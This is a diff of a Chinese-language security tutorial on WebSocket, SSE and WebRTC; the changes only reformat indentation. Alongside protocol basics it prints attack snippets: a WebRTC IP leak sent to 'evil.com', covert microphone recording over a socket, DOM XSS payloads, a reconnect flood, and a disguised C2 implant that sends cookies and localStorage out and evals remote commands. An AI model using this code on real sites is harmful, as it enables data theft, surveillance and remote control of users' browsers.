@@ -18,11 +18,11 @@
 WebSocket提供**全双工**、**持久化**的HTTP连接。与HTTP的请求-响应模式不同，WebSocket建立连接后双方可以随时发送数据。
 
 ```
-HTTP：  客户端 → 请求 → 服务器 → 响应 → 连接关闭
-        客户端 → 请求 → 服务器 → 响应 → 连接关闭  （重复）
+HTTP： 客户端 → 请求 → 服务器 → 响应 → 连接关闭
+ 客户端 → 请求 → 服务器 → 响应 → 连接关闭 （重复）
 
-WS：    客户端 ↔ 握手 ↔ 服务器
-        客户端 ↔ 消息 ↔ 服务器  （持久连接，双向）
+WS： 客户端 ↔ 握手 ↔ 服务器
+ 客户端 ↔ 消息 ↔ 服务器 （持久连接，双向）
 ```
 
 ### 握手过程
@@ -64,28 +64,28 @@ const ws = new WebSocket('wss://example.com/socket');
 
 // 事件处理
 ws.onopen = function() {
-  console.log('Connected');
-  ws.send(JSON.stringify({ type: 'join', room: 'general' }));
+ console.log('Connected');
+ ws.send(JSON.stringify({ type: 'join', room: 'general' }));
 };
 
 ws.onmessage = function(event) {
-  const data = JSON.parse(event.data);
-  console.log('Received:', data);
-  
-  // 处理不同类型消息
-  switch(data.type) {
-    case 'chat': displayMessage(data); break;
-    case 'alert': showAlert(data); break;
-    case 'command': executePayload(data); break;  // ← 攻击面！
-  }
+ const data = JSON.parse(event.data);
+ console.log('Received:', data);
+ 
+ // 处理不同类型消息
+ switch(data.type) {
+ case 'chat': displayMessage(data); break;
+ case 'alert': showAlert(data); break;
+ case 'command': executePayload(data); break; // ← 攻击面！
+ }
 };
 
 ws.onerror = function(error) {
-  console.error('WebSocket error:', error);
+ console.error('WebSocket error:', error);
 };
 
 ws.onclose = function(event) {
-  console.log('Disconnected:', event.code, event.reason);
+ console.log('Disconnected:', event.code, event.reason);
 };
 
 // 发送数据（支持文本和二进制）
@@ -102,22 +102,22 @@ const WebSocket = require('ws');
 const wss = new WebSocket.Server({ port: 8080 });
 
 wss.on('connection', function connection(ws, req) {
-  const ip = req.socket.remoteAddress;
-  console.log('New connection from', ip);
-  
-  ws.on('message', function incoming(data) {
-    console.log('received:', data);
-    // 广播给所有客户端
-    wss.clients.forEach(client => {
-      if (client.readyState === WebSocket.OPEN) {
-        client.send(data);
-      }
-    });
-  });
-  
-  ws.on('close', function() {
-    console.log('Client disconnected');
-  });
+ const ip = req.socket.remoteAddress;
+ console.log('New connection from', ip);
+ 
+ ws.on('message', function incoming(data) {
+ console.log('received:', data);
+ // 广播给所有客户端
+ wss.clients.forEach(client => {
+ if (client.readyState === WebSocket.OPEN) {
+ client.send(data);
+ }
+ });
+ });
+ 
+ ws.on('close', function() {
+ console.log('Client disconnected');
+ });
 });
 ```
 
@@ -139,16 +139,16 @@ wss.on('connection', function connection(ws, req) {
 const eventSource = new EventSource('/api/events');
 
 eventSource.onmessage = function(event) {
-  console.log('Message:', event.data);
+ console.log('Message:', event.data);
 };
 
 eventSource.addEventListener('alert', function(event) {
-  console.log('Alert:', event.data);
-  // 如果 event.data 直接插入DOM → XSS
+ console.log('Alert:', event.data);
+ // 如果 event.data 直接插入DOM → XSS
 });
 
 eventSource.onerror = function() {
-  // 自动重连是SSE的默认行为
+ // 自动重连是SSE的默认行为
 };
 ```
 
@@ -157,8 +157,8 @@ eventSource.onerror = function() {
 ```javascript
 // 如果SSE事件数据由攻击者控制
 eventSource.onmessage = function(event) {
-  resultDiv.innerHTML = event.data;  // ← DOM XSS
-  // event.data = '<img src=x onerror=alert(1)>'
+ resultDiv.innerHTML = event.data; // ← DOM XSS
+ // event.data = '<img src=x onerror=alert(1)>'
 };
 ```
 
@@ -169,20 +169,20 @@ eventSource.onmessage = function(event) {
 ```javascript
 // 本地媒体流
 navigator.mediaDevices.getUserMedia({ video: true, audio: true })
-  .then(stream => {
-    videoElement.srcObject = stream;
-  });
+ .then(stream => {
+ videoElement.srcObject = stream;
+ });
 
 // 屏幕共享
 navigator.mediaDevices.getDisplayMedia({ video: true })
-  .then(stream => { /* ... */ });
+ .then(stream => { /* ... */ });
 
 // P2P数据通道
 const pc = new RTCPeerConnection(config);
 const dataChannel = pc.createDataChannel('chat');
 
 dataChannel.onmessage = function(event) {
-  console.log('P2P Message:', event.data);
+ console.log('P2P Message:', event.data);
 };
 ```
 
@@ -194,21 +194,21 @@ const pc = new RTCPeerConnection({ iceServers: [] });
 pc.createDataChannel('');
 pc.createOffer().then(offer => pc.setLocalDescription(offer));
 pc.onicecandidate = e => {
-  if (!e.candidate) return;
-  const ip = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
-  if (ip) fetch('//evil.com/log?ip=' + ip[0]);
+ if (!e.candidate) return;
+ const ip = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
+ if (ip) fetch('//evil.com/log?ip=' + ip[0]);
 };
 
 // 2. 强制媒体访问
 navigator.mediaDevices.getUserMedia({ audio: true })
-  .then(stream => {
-    // 录音并通过WebSocket发送
-    const recorder = new MediaRecorder(stream);
-    recorder.ondataavailable = e => {
-      ws.send(e.data);
-    };
-    recorder.start(1000);
-  });
+ .then(stream => {
+ // 录音并通过WebSocket发送
+ const recorder = new MediaRecorder(stream);
+ recorder.ondataavailable = e => {
+ ws.send(e.data);
+ };
+ recorder.start(1000);
+ });
 ```
 
 ## 五、WebSocket安全漏洞
@@ -247,9 +247,9 @@ ws.onopen = () => ws.send(JSON.stringify({ action: 'transfer', amount: 10000 }))
 ```javascript
 // 如果收到的WebSocket消息直接插入DOM
 ws.onmessage = function(event) {
-  document.getElementById('messages').innerHTML += event.data;
-  // event.data = '<img src=x onerror=alert(1)>'
-  // → DOM XSS via WebSocket
+ document.getElementById('messages').innerHTML += event.data;
+ // event.data = '<img src=x onerror=alert(1)>'
+ // → DOM XSS via WebSocket
 };
 ```
 
@@ -258,10 +258,10 @@ ws.onmessage = function(event) {
 ```javascript
 // 无限重连轰炸
 function hammer() {
-  const ws = new WebSocket('wss://target.com/socket');
-  ws.onclose = () => setTimeout(hammer, 0);  // 立即重连
+ const ws = new WebSocket('wss://target.com/socket');
+ ws.onclose = () => setTimeout(hammer, 0); // 立即重连
 }
-for (let i = 0; i < 1000; i++) hammer();  // 1000并发重连
+for (let i = 0; i < 1000; i++) hammer(); // 1000并发重连
 ```
 
 ## 六、WebSocket在C2中的应用
@@ -282,36 +282,36 @@ for (let i = 0; i < 1000; i++) hammer();  // 1000并发重连
 ```javascript
 // 隐写C2通信（嵌入正常Web应用）
 (function() {
-  const c2 = new WebSocket('wss://cdn-cdn-statistics.com/metrics');
-  
-  c2.onopen = function() {
-    // 发送系统信息
-    c2.send(JSON.stringify({
-      type: 'beacon',
-      host: location.host,
-      userAgent: navigator.userAgent,
-      cookies: document.cookie,
-      localStorage: JSON.stringify(localStorage)
-    }));
-  };
-  
-  c2.onmessage = function(event) {
-    const cmd = JSON.parse(event.data);
-    try {
-      // 执行C2下发的命令
-      const result = eval(cmd.js);  // 危险：执行任意JS
-      c2.send(JSON.stringify({ type: 'result', data: result }));
-    } catch(e) {
-      c2.send(JSON.stringify({ type: 'error', data: e.message }));
-    }
-  };
-  
-  // 心跳
-  setInterval(() => {
-    if (c2.readyState === WebSocket.OPEN) {
-      c2.send('ping');
-    }
-  }, 30000);
+ const c2 = new WebSocket('wss://cdn-cdn-statistics.com/metrics');
+ 
+ c2.onopen = function() {
+ // 发送系统信息
+ c2.send(JSON.stringify({
+ type: 'beacon',
+ host: location.host,
+ userAgent: navigator.userAgent,
+ cookies: document.cookie,
+ localStorage: JSON.stringify(localStorage)
+ }));
+ };
+ 
+ c2.onmessage = function(event) {
+ const cmd = JSON.parse(event.data);
+ try {
+ // 执行C2下发的命令
+ const result = eval(cmd.js); // 危险：执行任意JS
+ c2.send(JSON.stringify({ type: 'result', data: result }));
+ } catch(e) {
+ c2.send(JSON.stringify({ type: 'error', data: e.message }));
+ }
+ };
+ 
+ // 心跳
+ setInterval(() => {
+ if (c2.readyState === WebSocket.OPEN) {
+ c2.send('ping');
+ }
+ }, 30000);
 })();
 ```
 
@@ -334,11 +334,11 @@ for (let i = 0; i < 1000; i++) hammer();  // 1000并发重连
 ```bash
 # 1. 检查WebSocket端点
 curl -i -N \
-  -H "Connection: Upgrade" \
-  -H "Upgrade: websocket" \
-  -H "Sec-WebSocket-Version: 13" \
-  -H "Sec-WebSocket-Key: $(openssl rand -base64 16)" \
-  https://target.com/socket
+ -H "Connection: Upgrade" \
+ -H "Upgrade: websocket" \
+ -H "Sec-WebSocket-Version: 13" \
+ -H "Sec-WebSocket-Key: $(openssl rand -base64 16)" \
+ https://target.com/socket
 
 # 2. 测试Origin验证
 # 使用Burp修改Origin头：
